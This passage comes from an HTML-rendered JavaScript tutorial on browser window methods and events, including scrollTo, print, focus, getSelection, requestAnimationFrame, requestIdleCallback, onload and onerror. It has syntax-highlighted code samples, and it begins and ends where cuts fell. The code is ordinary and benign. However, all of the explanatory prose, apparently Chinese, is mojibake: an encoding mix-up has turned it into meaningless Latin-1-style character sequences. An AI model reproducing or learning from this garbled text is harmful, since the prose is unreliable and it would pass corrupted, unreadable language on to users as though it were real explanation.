punctuation">,</span> y<span class="token operator">-</span>coord<span class="token punctuation">)</span>
</code></pre></div><p>å®ƒä¹Ÿå¯ä»¥æ¥å—ä¸€ä¸ªé…ç½®å¯¹è±¡ä½œä¸ºå‚æ•°ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">scrollTo</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span>
</code></pre></div><p>é…ç½®å¯¹è±¡<code>options</code>æœ‰ä¸‰ä¸ªå±æ€§ã€‚</p><ul><li><code>top</code>ï¼šæ»šåŠ¨åé¡µé¢å·¦ä¸Šè§’çš„å‚ç›´åæ ‡ï¼Œå³ y åæ ‡ã€‚</li><li><code>left</code>ï¼šæ»šåŠ¨åé¡µé¢å·¦ä¸Šè§’çš„æ°´å¹³åæ ‡ï¼Œå³ x åæ ‡ã€‚</li><li><code>behavior</code>ï¼šå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ»šåŠ¨çš„æ–¹å¼ï¼Œæœ‰ä¸‰ä¸ªå¯èƒ½å€¼ï¼ˆ<code>smooth</code>ã€<code>instant</code>ã€<code>auto</code>ï¼‰ï¼Œé»˜è®¤å€¼ä¸º<code>auto</code>ã€‚</li></ul><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">scrollTo</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  <span class="token literal-property property">top</span><span class="token operator">:</span> <span class="token number">1000</span><span class="token punctuation">,</span>
  <span class="token literal-property property">behavior</span><span class="token operator">:</span> <span class="token string">&#39;smooth&#39;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p><code>window.scroll()</code>æ–¹æ³•æ˜¯<code>window.scrollTo()</code>æ–¹æ³•çš„åˆ«åã€‚</p><p><code>window.scrollBy()</code>æ–¹æ³•ç”¨äºå°†ç½‘é¡µæ»šåŠ¨æŒ‡å®šè·ç¦»ï¼ˆå•ä½åƒç´ ï¼‰ã€‚å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼šæ°´å¹³å‘å³æ»šåŠ¨çš„åƒç´ ï¼Œå‚ç›´å‘ä¸‹æ»šåŠ¨çš„åƒç´ ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">scrollBy</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>innerHeight<span class="token punctuation">)</span>
</code></pre></div><p>ä¸Šé¢ä»£ç ç”¨äºå°†ç½‘é¡µå‘ä¸‹æ»šåŠ¨ä¸€å±ã€‚</p><p>å¦‚æœä¸æ˜¯è¦æ»šåŠ¨æ•´ä¸ªæ–‡æ¡£ï¼Œè€Œæ˜¯è¦æ»šåŠ¨æŸä¸ªå…ƒç´ ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢ä¸‰ä¸ªå±æ€§å’Œæ–¹æ³•ã€‚</p><ul><li>Element.scrollTop</li><li>Element.scrollLeft</li><li>Element.scrollIntoView()</li></ul><h4 id="window-print" tabindex="-1"><a class="header-anchor" href="#window-print" aria-hidden="true">#</a> window.print()</h4><p><code>window.print</code>æ–¹æ³•ä¼šè·³å‡ºæ‰“å°å¯¹è¯æ¡†ï¼Œä¸ç”¨æˆ·ç‚¹å‡»èœå•é‡Œé¢çš„â€œæ‰“å°â€å‘½ä»¤æ•ˆæœç›¸åŒã€‚</p><p>å¸¸è§çš„æ‰“å°æŒ‰é’®ä»£ç å¦‚ä¸‹ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&#39;printLink&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  window<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>éæ¡Œé¢è®¾å¤‡ï¼ˆæ¯”å¦‚æ‰‹æœºï¼‰å¯èƒ½æ²¡æœ‰æ‰“å°åŠŸèƒ½ï¼Œè¿™æ—¶å¯ä»¥è¿™æ ·åˆ¤æ–­ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> window<span class="token punctuation">.</span>print <span class="token operator">===</span> <span class="token string">&#39;function&#39;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// æ”¯æŒæ‰“å°åŠŸèƒ½</span>
<span class="token punctuation">}</span>
</code></pre></div><h4 id="window-focus-window-blur" tabindex="-1"><a class="header-anchor" href="#window-focus-window-blur" aria-hidden="true">#</a> window.focus()ï¼Œwindow.blur()</h4><p><code>window.focus()</code>æ–¹æ³•ä¼šæ¿€æ´»çª—å£ï¼Œä½¿å…¶è·å¾—ç„¦ç‚¹ï¼Œå‡ºç°åœ¨å…¶ä»–çª—å£çš„å‰é¢ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> popup <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&#39;popup.html&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;Popup Window&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>popup <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>popup<span class="token punctuation">.</span>closed<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  popup<span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>ä¸Šé¢ä»£ç å…ˆæ£€æŸ¥<code>popup</code>çª—å£æ˜¯å¦ä¾ç„¶å­˜åœ¨ï¼Œç¡®è®¤åæ¿€æ´»è¯¥çª—å£ã€‚</p><p><code>window.blur()</code>æ–¹æ³•å°†ç„¦ç‚¹ä»çª—å£ç§»é™¤ã€‚</p><p>å½“å‰çª—å£è·å¾—ç„¦ç‚¹æ—¶ï¼Œä¼šè§¦å‘<code>focus</code>äº‹ä»¶ï¼›å½“å‰çª—å£å¤±å»ç„¦ç‚¹æ—¶ï¼Œä¼šè§¦å‘<code>blur</code>äº‹ä»¶ã€‚</p><h3 id="window-getselection" tabindex="-1"><a class="header-anchor" href="#window-getselection" aria-hidden="true">#</a> window.getSelection()</h3><p><code>window.getSelection</code>æ–¹æ³•è¿”å›ä¸€ä¸ª<code>Selection</code>å¯¹è±¡ï¼Œè¡¨ç¤ºç”¨æˆ·ç°åœ¨é€‰ä¸­çš„æ–‡æœ¬ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> selObj <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">getSelection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>ä½¿ç”¨<code>Selection</code>å¯¹è±¡çš„<code>toString</code>æ–¹æ³•å¯ä»¥å¾—åˆ°é€‰ä¸­çš„æ–‡æœ¬ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> selectedText <span class="token operator">=</span> selObj<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><h4 id="window-getcomputedstyle-window-matchmedia" tabindex="-1"><a class="header-anchor" href="#window-getcomputedstyle-window-matchmedia" aria-hidden="true">#</a> window.getComputedStyle()ï¼Œwindow.matchMedia()</h4><p><code>window.getComputedStyle()</code>æ–¹æ³•æ¥å—ä¸€ä¸ªå…ƒç´ èŠ‚ç‚¹ä½œä¸ºå‚æ•°ï¼Œè¿”å›ä¸€ä¸ªåŒ…å«è¯¥å…ƒç´ çš„æœ€ç»ˆæ ·å¼ä¿¡æ¯çš„å¯¹è±¡ï¼Œè¯¦è§ã€ŠCSS æ“ä½œã€‹ä¸€ç« ã€‚</p><p><code>window.matchMedia()</code>æ–¹æ³•ç”¨æ¥æ£€æŸ¥ CSS çš„<code>mediaQuery</code>è¯­å¥ï¼Œè¯¦è§ã€ŠCSS æ“ä½œã€‹ä¸€ç« ã€‚</p><h4 id="window-requestanimationframe" tabindex="-1"><a class="header-anchor" href="#window-requestanimationframe" aria-hidden="true">#</a> window.requestAnimationFrame()</h4><p><code>window.requestAnimationFrame()</code>æ–¹æ³•è·Ÿ<code>setTimeout</code>ç±»ä¼¼ï¼Œéƒ½æ˜¯æ¨è¿ŸæŸä¸ªå‡½æ•°çš„æ‰§è¡Œã€‚ä¸åŒä¹‹å¤„åœ¨äºï¼Œ<code>setTimeout</code>å¿…é¡»æŒ‡å®šæ¨è¿Ÿçš„æ—¶é—´ï¼Œ<code>window.requestAnimationFrame()</code>åˆ™æ˜¯æ¨è¿Ÿåˆ°æµè§ˆå™¨ä¸‹ä¸€æ¬¡é‡æµæ—¶æ‰§è¡Œï¼Œæ‰§è¡Œå®Œæ‰ä¼šè¿›è¡Œä¸‹ä¸€æ¬¡é‡ç»˜ã€‚é‡ç»˜é€šå¸¸æ˜¯ 16ms æ‰§è¡Œä¸€æ¬¡ï¼Œä¸è¿‡æµè§ˆå™¨ä¼šè‡ªåŠ¨è°ƒèŠ‚è¿™ä¸ªé€Ÿç‡ï¼Œæ¯”å¦‚ç½‘é¡µåˆ‡æ¢åˆ°åå° Tab é¡µæ—¶ï¼Œ<code>requestAnimationFrame()</code>ä¼šæš‚åœæ‰§è¡Œã€‚</p><p>å¦‚æœæŸä¸ªå‡½æ•°ä¼šæ”¹å˜ç½‘é¡µçš„å¸ƒå±€ï¼Œä¸€èˆ¬å°±æ”¾åœ¨<code>window.requestAnimationFrame()</code>é‡Œé¢æ‰§è¡Œï¼Œè¿™æ ·å¯ä»¥èŠ‚çœç³»ç»Ÿèµ„æºï¼Œä½¿å¾—ç½‘é¡µæ•ˆæœæ›´åŠ å¹³æ»‘ã€‚å› ä¸ºæ…¢é€Ÿè®¾å¤‡ä¼šç”¨è¾ƒæ…¢çš„é€Ÿç‡é‡æµå’Œé‡ç»˜ï¼Œè€Œé€Ÿåº¦æ›´å¿«çš„è®¾å¤‡ä¼šæœ‰æ›´å¿«çš„é€Ÿç‡ã€‚</p><p>è¯¥æ–¹æ³•æ¥å—ä¸€ä¸ªå›è°ƒå‡½æ•°ä½œä¸ºå‚æ•°ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span>callback<span class="token punctuation">)</span>
</code></pre></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>callback</code>æ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°ã€‚<code>callback</code>æ‰§è¡Œæ—¶ï¼Œå®ƒçš„å‚æ•°å°±æ˜¯ç³»ç»Ÿä¼ å…¥çš„ä¸€ä¸ªé«˜ç²¾åº¦æ—¶é—´æˆ³ï¼ˆ<code>performance.now()</code>çš„è¿”å›å€¼ï¼‰ï¼Œå•ä½æ˜¯æ¯«ç§’ï¼Œè¡¨ç¤ºè·ç¦»ç½‘é¡µåŠ è½½çš„æ—¶é—´ã€‚</p><p><code>window.requestAnimationFrame()</code>çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œè¿™ä¸ªæ•´æ•°å¯ä»¥ä¼ å…¥<code>window.cancelAnimationFrame()</code>ï¼Œç”¨æ¥å–æ¶ˆå›è°ƒå‡½æ•°çš„æ‰§è¡Œã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ª<code>window.requestAnimationFrame()</code>æ‰§è¡Œç½‘é¡µåŠ¨ç”»çš„ä¾‹å­ã€‚</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> element <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&#39;animate&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
element<span class="token punctuation">.</span>style<span class="token punctuation">.</span>position <span class="token operator">=</span> <span class="token string">&#39;absolute&#39;</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> start <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">step</span><span class="token punctuation">(</span><span class="token parameter">timestamp</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>start<span class="token punctuation">)</span> start <span class="token operator">=</span> timestamp<span class="token punctuation">;</span>
  <span class="token keyword">var</span> progress <span class="token operator">=</span> timestamp <span class="token operator">-</span> start<span class="token punctuation">;</span>
  <span class="token comment">// å…ƒç´ ä¸æ–­å‘å·¦ç§»ï¼Œæœ€å¤§ä¸è¶…è¿‡200åƒç´ </span>
  element<span class="token punctuation">.</span>style<span class="token punctuation">.</span>left <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>progress <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&#39;px&#39;</span><span class="token punctuation">;</span>
  <span class="token comment">// å¦‚æœè·ç¦»ç¬¬ä¸€æ¬¡æ‰§è¡Œä¸è¶…è¿‡ 2000 æ¯«ç§’ï¼Œ</span>
  <span class="token comment">// å°±ç»§ç»­æ‰§è¡ŒåŠ¨ç”»</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>progress <span class="token operator">&lt;</span> <span class="token number">2000</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    window<span class="token punctuation">.</span><span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span>step<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

window<span class="token punctuation">.</span><span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span>step<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>ä¸Šé¢ä»£ç å®šä¹‰äº†ä¸€ä¸ªç½‘é¡µåŠ¨ç”»ï¼ŒæŒç»­æ—¶é—´æ˜¯2ç§’ï¼Œä¼šè®©å…ƒç´ å‘å³ç§»åŠ¨ã€‚</p><h4 id="window-requestidlecallback" tabindex="-1"><a class="header-anchor" href="#window-requestidlecallback" aria-hidden="true">#</a> window.requestIdleCallback()</h4><p><code>window.requestIdleCallback()</code>è·Ÿ<code>setTimeout</code>ç±»ä¼¼ï¼Œä¹Ÿæ˜¯å°†æŸä¸ªå‡½æ•°æ¨è¿Ÿæ‰§è¡Œï¼Œä½†æ˜¯å®ƒä¿è¯å°†å›è°ƒå‡½æ•°æ¨è¿Ÿåˆ°ç³»ç»Ÿèµ„æºç©ºé—²æ—¶æ‰§è¡Œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæŸä¸ªä»»åŠ¡ä¸æ˜¯å¾ˆå…³é”®ï¼Œå°±å¯ä»¥ä½¿ç”¨<code>window.requestIdleCallback()</code>å°†å…¶æ¨è¿Ÿæ‰§è¡Œï¼Œä»¥ä¿è¯ç½‘é¡µæ€§èƒ½ã€‚</p><p>å®ƒè·Ÿ<code>window.requestAnimationFrame()</code>çš„åŒºåˆ«åœ¨äºï¼Œåè€…æŒ‡å®šå›è°ƒå‡½æ•°åœ¨ä¸‹ä¸€æ¬¡æµè§ˆå™¨é‡æ’æ—¶æ‰§è¡Œï¼Œé—®é¢˜åœ¨äºä¸‹ä¸€æ¬¡é‡æ’æ—¶ï¼Œç³»ç»Ÿèµ„æºæœªå¿…ç©ºé—²ï¼Œä¸ä¸€å®šèƒ½ä¿è¯åœ¨16æ¯«ç§’ä¹‹å†…å®Œæˆï¼›<code>window.requestIdleCallback()</code>å¯ä»¥ä¿è¯å›è°ƒå‡½æ•°åœ¨ç³»ç»Ÿèµ„æºç©ºé—²æ—¶æ‰§è¡Œã€‚</p><p>è¯¥æ–¹æ³•æ¥å—ä¸€ä¸ªå›è°ƒå‡½æ•°å’Œä¸€ä¸ªé…ç½®å¯¹è±¡ä½œä¸ºå‚æ•°ã€‚é…ç½®å¯¹è±¡å¯ä»¥æŒ‡å®šä¸€ä¸ªæ¨è¿Ÿæ‰§è¡Œçš„æœ€é•¿æ—¶é—´ï¼Œå¦‚æœè¿‡äº†è¿™ä¸ªæ—¶é—´ï¼Œå›è°ƒå‡½æ•°ä¸ç®¡ç³»ç»Ÿèµ„æºæœ‰æ— ç©ºé—²ï¼Œéƒ½ä¼šæ‰§è¡Œã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">requestIdleCallback</span><span class="token punctuation">(</span>callback<span class="token punctuation">[</span><span class="token punctuation">,</span> options<span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre></div><p><code>callback</code>å‚æ•°æ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°ã€‚è¯¥å›è°ƒå‡½æ•°æ‰§è¡Œæ—¶ï¼Œç³»ç»Ÿä¼šä¼ å…¥ä¸€ä¸ª<code>IdleDeadline</code>å¯¹è±¡ä½œä¸ºå‚æ•°ã€‚<code>IdleDeadline</code>å¯¹è±¡æœ‰ä¸€ä¸ª<code>didTimeout</code>å±æ€§ï¼ˆå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦ä¸ºè¶…æ—¶è°ƒç”¨ï¼‰å’Œä¸€ä¸ª<code>timeRemaining()</code>æ–¹æ³•ï¼ˆè¿”å›è¯¥ç©ºé—²æ—¶æ®µå‰©ä½™çš„æ¯«ç§’æ•°ï¼‰ã€‚</p><p><code>options</code>å‚æ•°æ˜¯ä¸€ä¸ªé…ç½®å¯¹è±¡ï¼Œç›®å‰åªæœ‰<code>timeout</code>ä¸€ä¸ªå±æ€§ï¼Œç”¨æ¥æŒ‡å®šå›è°ƒå‡½æ•°æ¨è¿Ÿæ‰§è¡Œçš„æœ€å¤§æ¯«ç§’æ•°ã€‚è¯¥å‚æ•°å¯é€‰ã€‚</p><p><code>window.requestIdleCallback()</code>æ–¹æ³•è¿”å›ä¸€ä¸ªæ•´æ•°ã€‚è¯¥æ•´æ•°å¯ä»¥ä¼ å…¥<code>window.cancelIdleCallback()</code>å–æ¶ˆå›è°ƒå‡½æ•°ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token function">requestIdleCallback</span><span class="token punctuation">(</span>myNonEssentialWork<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">myNonEssentialWork</span><span class="token punctuation">(</span><span class="token parameter">deadline</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span>deadline<span class="token punctuation">.</span><span class="token function">timeRemaining</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">doWorkIfNeeded</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>requestIdleCallback()</code>ç”¨æ¥æ‰§è¡Œéå…³é”®ä»»åŠ¡<code>myNonEssentialWork</code>ã€‚è¯¥ä»»åŠ¡å…ˆç¡®è®¤æœ¬æ¬¡ç©ºé—²æ—¶æ®µæœ‰å‰©ä½™æ—¶é—´ï¼Œç„¶åæ‰çœŸæ­£å¼€å§‹æ‰§è¡Œä»»åŠ¡ã€‚</p><p>ä¸‹é¢æ˜¯æŒ‡å®š<code>timeout</code>çš„ä¾‹å­ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token function">requestIdleCallback</span><span class="token punctuation">(</span>processPendingAnalyticsEvents<span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">2000</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>ä¸Šé¢ä»£ç æŒ‡å®šï¼Œ<code>processPendingAnalyticsEvents</code>å¿…é¡»åœ¨æœªæ¥2ç§’ä¹‹å†…æ‰§è¡Œã€‚</p><p>å¦‚æœç”±äºè¶…æ—¶å¯¼è‡´å›è°ƒå‡½æ•°æ‰§è¡Œï¼Œåˆ™<code>deadline.timeRemaining()</code>è¿”å›<code>0</code>ï¼Œ<code>deadline.didTimeout</code>è¿”å›<code>true</code>ã€‚</p><p>å¦‚æœå¤šæ¬¡æ‰§è¡Œ<code>window.requestIdleCallback()</code>ï¼ŒæŒ‡å®šå¤šä¸ªå›è°ƒå‡½æ•°ï¼Œé‚£ä¹ˆè¿™äº›å›è°ƒå‡½æ•°å°†æ’æˆä¸€ä¸ªé˜Ÿåˆ—ï¼ŒæŒ‰ç…§å…ˆè¿›å…ˆå‡ºçš„é¡ºåºæ‰§è¡Œã€‚</p><h3 id="äº‹ä»¶" tabindex="-1"><a class="header-anchor" href="#äº‹ä»¶" aria-hidden="true">#</a> äº‹ä»¶</h3><p><code>window</code>å¯¹è±¡å¯ä»¥æ¥æ”¶ä»¥ä¸‹äº‹ä»¶ã€‚</p><h4 id="load-äº‹ä»¶å’Œ-onload-å±æ€§" tabindex="-1"><a class="header-anchor" href="#load-äº‹ä»¶å’Œ-onload-å±æ€§" aria-hidden="true">#</a> load äº‹ä»¶å’Œ onload å±æ€§</h4><p><code>load</code>äº‹ä»¶å‘ç”Ÿåœ¨æ–‡æ¡£åœ¨æµè§ˆå™¨çª—å£åŠ è½½å®Œæ¯•æ—¶ã€‚<code>window.onload</code>å±æ€§å¯ä»¥æŒ‡å®šè¿™ä¸ªäº‹ä»¶çš„å›è°ƒå‡½æ•°ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> elements <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByClassName</span><span class="token punctuation">(</span><span class="token string">&#39;example&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> elements<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> elt <span class="token operator">=</span> elements<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token comment">// ...</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre></div><p>ä¸Šé¢ä»£ç åœ¨ç½‘é¡µåŠ è½½å®Œæ¯•åï¼Œè·å–æŒ‡å®šå…ƒç´ å¹¶è¿›è¡Œå¤„ç†ã€‚</p><h4 id="error-äº‹ä»¶å’Œ-onerror-å±æ€§" tabindex="-1"><a class="header-anchor" href="#error-äº‹ä»¶å’Œ-onerror-å±æ€§" aria-hidden="true">#</a> error äº‹ä»¶å’Œ onerror å±æ€§</h4><p>æµè§ˆå™¨è„šæœ¬å‘ç”Ÿé”™è¯¯æ—¶ï¼Œä¼šè§¦å‘<code>window</code>å¯¹è±¡çš„<code>error</code>äº‹ä»¶ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>window.onerror</code>å±æ€§å¯¹è¯¥äº‹ä»¶æŒ‡å®šå›è°ƒå‡½æ•°ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">message<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> lineno<span class="token punctuation">,</span> colno<span class="token punctuation">,</span> error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;å‡ºé”™äº†ï¼--&gt; %s&quot;</span><span class="token punctuation">,</span> error<span class="token punctuation">.</span>stack<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre></div><p>ç”±äºå†å²åŸå› ï¼Œ<code>window</code>çš„<code>error</code>äº‹ä»¶çš„å›è°ƒå‡½æ•°ä¸æ¥å—é”™è¯¯å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œè€Œæ˜¯ä¸€å…±å¯ä»¥æ¥å—äº”ä¸ªå‚æ•°ï¼Œå®ƒä»¬çš„å«ä¹‰ä¾æ¬¡å¦‚ä¸‹ã€‚</p><ul><li>å‡ºé”™ä¿¡æ¯</li><li>å‡ºé”™è„šæœ¬çš„ç½‘å€</li><li>è¡Œå·</li><li>åˆ—å·</li><li>é”™è¯¯å¯¹è±¡</li></ul><p>è€å¼æµè§ˆå™¨åªæ”¯æŒå‰ä¸‰ä¸ªå‚æ•°ã€‚</p><p>å¹¶ä¸æ˜¯æ‰€æœ‰çš„é”™è¯¯ï¼Œéƒ½ä¼šè§¦å‘ JavaScript çš„<code>error</code>äº‹ä»¶ï¼ˆå³è®© JavaScript æŠ¥é”™ï¼‰ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œåªæœ‰ JavaScript è„šæœ¬çš„é”™è¯¯ï¼Œæ‰ä¼šè§¦å‘è¿™ä¸ªäº‹ä»¶ï¼Œè€Œåƒèµ„æºæ–‡ä»¶ä¸å­˜åœ¨ä¹‹ç±»çš„é”™è¯¯ï¼Œéƒ½ä¸ä¼šè§¦å‘ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œå¦‚æœæ•´ä¸ªé¡µé¢æœªæ•è·é”™è¯¯è¶…è¿‡3ä¸ªï¼Œå°±æ˜¾ç¤ºè­¦å‘Šã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">msg<span class="token punctuation">,</span> url<span class="token punctuation">,</span> line</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>onerror<span class="token punctuation">.</span>num<span class="token operator">++</span> <span class="token operator">&gt;</span> onerror<span class="token punctuation">.</span>max<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&#39;ERROR: &#39;</span> <span class="token operator">+</span> msg <span class="token operator">+</span> <span class="token string">&#39;\n&#39;</span> <span class="token operator">+</span> url <span class="token operator">+</span> <span class="token string">&#39;:&#39;</span> <span class="token operator">+</span> line<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
onerror<span class="token punctuation">.</span>max <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
onerror<span class="token punctuation">.</span>num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
